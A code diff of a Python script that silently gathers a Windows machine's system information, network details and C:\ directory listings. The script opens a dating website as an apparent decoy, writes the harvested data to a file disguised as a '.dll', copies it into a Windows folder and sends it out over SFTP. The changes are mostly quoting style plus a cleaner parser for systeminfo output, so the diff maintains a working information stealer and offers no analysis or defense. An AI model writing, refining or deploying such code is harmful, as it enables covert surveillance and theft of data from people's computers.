@@ -8,7 +8,7 @@ def install_dependencies():
     try:
         import paramiko
     except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "paramiko"])
+        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'paramiko'])
 
 install_dependencies()
 import paramiko
@@ -19,18 +19,23 @@ dirList = []
 
 def open_browser():
     # OPENS EHARMONY WEBSITE
-    webbrowser.open("http://www.eharmony.com.au/")
+    webbrowser.open('http://www.eharmony.com.au/')
 
 def get_system_info():
     # FINDS SYSTEM INFORMATION
     print('<<SYSTEM INFORMATION>>')
-    ID = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
+    ID = subprocess.check_output(
+        ['systeminfo'],
+        text=True,
+        encoding='utf-8',
+        errors='replace'  
+    )
 
-
-    for item in ID:
-        sysList.append(str(item.split("\r")[:-1]))
-    for i in sysList:
-        print(i[2:-2])
+    for line in ID.splitlines():
+        cleaned = line.strip()
+        if cleaned:
+            sysList.append(cleaned)
+            print(cleaned)
 
 def get_network_info():
     # FINDS NETWORK INFORMATION
@@ -55,24 +60,24 @@ def get_directories():
 
 def write_to_file():
     # CREATES AND WRITES INFO TO .DLL FILE IN DIRECTORY
-    f = open("system_things.dll", "w")
-    f.write("<<SYSTEM INFORMATION>> \n\n")
+    f = open('system_things.dll', 'w')
+    f.write('<<SYSTEM INFORMATION>> \n\n')
     for itemFile in sysList:
-        f.write(itemFile + "\n")
-    f.write("\n\n")
-    f.write("<<NETWORK INFORMATION>> \n\n")
+        f.write(itemFile + '\n')
+    f.write('\n\n')
+    f.write('<<NETWORK INFORMATION>> \n\n')
     for itemFile in dataList:
-        f.write(itemFile + "\n")
-    f.write("\n\n")
-    f.write("<<C:\\ DIRECTORIES>> \n\n")
+        f.write(itemFile + '\n')
+    f.write('\n\n')
+    f.write('<<C:\\ DIRECTORIES>> \n\n')
     for itemFile in dirList:
-        f.write(itemFile + "\n")
+        f.write(itemFile + '\n')
     f.close()
 
 def copy_dll_to_windows():
     # COPIES .DLL FILE TO WINDOWS FOLDER
-    original = "system_things.dll"
-    target = r""  # Change directory path as needed
+    original = 'system_things.dll'
+    target = r''  # Change directory path as needed
 
     shutil.copyfile(original, target)
 
@@ -95,5 +100,5 @@ def main():
     copy_dll_to_windows()
     send_dll_to_sftp()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
